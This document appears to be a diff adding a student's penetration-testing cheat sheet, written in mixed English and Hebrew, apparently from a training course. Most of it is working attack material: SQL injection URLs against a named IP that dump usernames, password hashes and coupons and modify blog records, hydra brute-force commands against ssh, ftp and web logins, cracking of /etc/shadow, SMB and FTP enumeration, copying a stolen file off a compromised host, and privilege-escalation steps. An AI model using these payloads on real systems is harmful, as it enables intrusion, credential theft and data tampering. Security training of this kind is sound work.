@@ -1,0 +1,176 @@
+find / -perm /4000 2> /dev/null   - gives us all the file with setuit
+sudo -l   show me important stuff about sudo and programs
+sudo -i
+
+The ip address of the site : http://3.66.245.154/
+(need to replace this ip with the ip's in this page)
+
+1) http://3.66.245.154/classes.php?day=Wednesday ' ORDER BY 1 %23 
+  - find how many columns in the table.
+
+2) http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,2,3,4,5,6,7 %23 
+ - find which columns are visible in the table.
+
+3) http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,DATABASE(),3,4,5,6,7 %23 
+- column 2 is visible so we want the name of the database first.
+
+
+database name  = Cyber_training	
+
+4) http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema = 'cyber_training' %23  
+- get table names in database
+
+
+5) http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema = 'cyber_training' and table_name = 'users' %23
+- get columns of specific table in the database
+
+
+6) http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,username,password,4,5,6,7 FROM users  WHERE username = 'Cyber' %23
+-get the password of user 'Cyber'
+
+with https://hashes.com/ we can resolve hashcode to password
+
+------------------------------------------------------------------------------------------------------
+Coupons:
+** in order to disable the min length in INPUT , we need to chagne to js code.
+
+http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema = 'cyber_training' and table_name = 'coupons' %23
+
+ http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,coupon,used,4,id,6,7 FROM coupons WHERE used = '0' %23
+
+columns : used,coupon,id
+
+------------------------------------------------------------------------------------------------------
+ 3) change the name of user cyber in the blog table.
+
+ http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_schema = 'cyber_training' and table_name = 'blog' %23
+
+
+http://3.66.245.154/classes.php?day=Wednesday ' UNION SELECT 1,username,name,4,message,6,7 FROM blog WHERE username = 'Cyber' %23
+
+http://3.66.245.154/classes.php?day=Wednesday ' UPDATE blog SET name = 'Eran the hacker!' WHERE username = 'Cyber' %23
+
+UNION SELECT 1,username,name,4,message,6,7 FROM blog WHERE username = 'Cyber' %23
+
+----------------------------------------------------------------------------------------------------
+SCANS WITH KALI:
+
+grep -E "/bin/bash|/bin/[a-z]?sh" passwd | cut -d: -f1 > new_userlist  יצירת יוזר ליסט מקובץ passwd
+
+ssh -D 8080 [public_kali_ip] -l kali -N
+פקודה שמעבירה אותנו למחשב המרוחק(פורט פוורד) , נשים את זה בטרמינל של המחשב שלנו לא של הקאלי!
+כעת נפתח פיירפוקס ונכניס את כתובת המחשב שאנחנו רוצים לתקוף,
+הפקודה בעצם גורמת לכל אפליקציה שפונה אליי בפורט 8080 לעבור בצינור שיצרתי עם הקאלי 
+
+nmap -sn -T5 10.0.1.0/24  find which computers in network 10.0.1.0/24 is up
+export target=10.0.1.95  save the ip in variable
+sudo nmap -sS -T5 $target  find the open ports in the computer we want to attack
+nmap -sV -T5 -Pn $target    find the applications behind the open ports
+sudo nmap -sV -p- -Pn -T5 $target    deep scan all the port, do in new terminal!
+
+
+FTP enumeration:
+
+ftp $target  (can replace the $target with specific ip address)
+username: anonymous
+password: anonymous
+* important to have - 230 login successful
+dir (show the files in the ftp)
+get name_of_file (download the file to out kali)
+
+
+SMB enumeration:
+
+sudo smbclient -L //$target -N (get the share files , the file with $ is secured, can not open)
+smbclient //$target/tmp -N   (the tmp is specific file we found)
+smbclient //$target/tmp -N ( this commant acces the share file called 'tmp'
+if the smb login succeeded: "smb: \>"
+now we run the command "dir" to seach for files.
+get [filename]  - a command to download the file to our virtual machine
+
+HTTP enumeration:
+
+dirb http://10.0.1.95  look for pages in the site
+nikto -h  http://10.0.1.95:port number  מאפשר לסרוק את השרת ווב  בצורה יותר מלאה
+robost.txt קובץ שאתרים מסתירים שלא רוצים שמנועי חיפוש יפנו אליהם
+
+
+nano userlist - create new file with name "userlist"
+rockyou.txt - 16 million password file, use to america
+
+
+MYSQL enumeration:
+# mysql -u username -p -h [ip address]
+
+
+
+names: Harry, Elly, John,  Barry, Fred, Kathy
+------------------------------------------------------------------------------------------------------
+
+Brute Force to attack known apps:smb,ssh,ftp...:
+**remember - not user rockyou.txt  to brutforce remote computer**
+
+flags:
+ -l single user, -L users,-p single password, -P passwords ,nsr ( "",user,resu),  -V show the attemps,
+-I not to start from the previous search 
+
+ hydra -l [username] -P [password file for example] -e nsr -t 4 -V [port]://[ip to attack]
+ hydra -L userlist -e nsr -t 4 -V ssh://10.0.1.95   by default ssh prevent to connect with root
+ hydra -L userlist -e nsr -t 4 -V ftp://10.0.1.95
+
+Brute Force to attack website:
+ברוט פורס לאתר זה שונה מאשר לאפליקציות שלמדנו, אף אחד לא מבטיח לנו מבנה אחיד לדף
+
+what we need to tell hydra ? methods(Get,post...), form inputs, page, error
+
+example:
+*with Inspect in the website we want to get - page name , variable name of username password, error message 
+
+hydra -l admin -P rockyou.txt -t 64 -V [pharmax-medical.com or host IP] http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password"
+
+ hydra -L new_userlist7 -P dictionary.list -t 64 -V 10.0.1.200 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failure" 
+
+result: [80][http-post-form] host: pharmax-medical.com   login: admin   password: Jennifer
+
+cewl -m 5 -d 2 -w dictionary.list http://10.0.1.200
+-m min characters , -w where to write , -d depth
+------------------------------------------------------------------------------------------------------
+
+Hash brute force:
+
+website to work with hash codes: https://hashes.com
+
+John the ripper - tool to crack hash codes
+john --wordlist=[dictionary] --format=[hash type] [file to crack]
+sudo john /etc/shadow   - crack user and passwork with shadow file
+sudo john --wordlist=passlist /etc/shadow - crack hashcodes in shadow file with given list of password 
+john --wordlist=/home/kali/rockyou.txt --format=Raw-MD5 passwords_ex.txt
+hash-identifier , tool to check what the format of the hashcode
+
+
+ # unshadow /etc/passwd /etc/shadow > mypasswd.txt  - John offers a nifty utility called unshadow, which we will use to create a file from our passwd and shadow files
+ $ /usr/sbin/john mypasswd.txt  - give john the file (format user:hashcode)
+ $ /usr/sbin/john --show mypasswd.txt -If John is succesful in cracking one of the passwords, it will write to ~/.john/john.pot. However, that file isn't human-readable, so you can read cracked passwords with
+
+------------------------------------------------------------------------------------------------------
+$ scp username@from_host:file.txt /local/directory/  מאפשר להעביר קובץ מהקאלי למחשב האישי שלנו
+
+שלבים:
+scp secret kali@10.0.0.10:/home/kali/secret העברת קובץ מהעמדת תקיפה למחשב קאלי, עושים את זה ברוט של המחשב המותקף
+scp kali@18.156.101.169:/home/kali/erankamil/secret C:\Users\eranka\Desktop העברת הקובץ מהקאלי אליי למחשב , עושים את זה בסי אמ די שלי
+
+שתי דרכים: SCP, לשים בתיקייה /var/www/html ולהפעיל את שירות Apache2
+# /etc/init.d/apache2 start  הפעלת אפאצ'י שרת הווב
+systemctl status apache2.service מצב השרת ווב
+sudo service apache2 start הפעלת שרת הווב בעמדה
+
+enum4linux -U -R 1000-1100 - הפקודה רצה על האס אמ בי ומוציאה את השמות משתמשים ווינדוס 
+grep -E 'u\-[0-9]{3}' enum_result  שימוש בגרפ על מנת לבצע רג'קס למשתמשים מסוג U-XXX
+grep -Eo 'u\-[0-9]{3}' enum_result ייתן לנו רק את התוצאות לפי מה שביקשתי ולא את כל השורה
+
+---------------------------------------------------------------------------------------------------------
+privilege Escelation
+
+sudo -l  מציאת כל התכניות שמקבל עליהן הרשאות רוט מתי שמריצים אותן
+su -  בקשה להתחברות עם רוט , במקרה ויש לנו את הסיסמא 
+לאחר מכן יש לגשת לקובץ הנוסף לגבי השיעור של ההרשאות ואיך לבצע את הפקודות הרלוונטיות
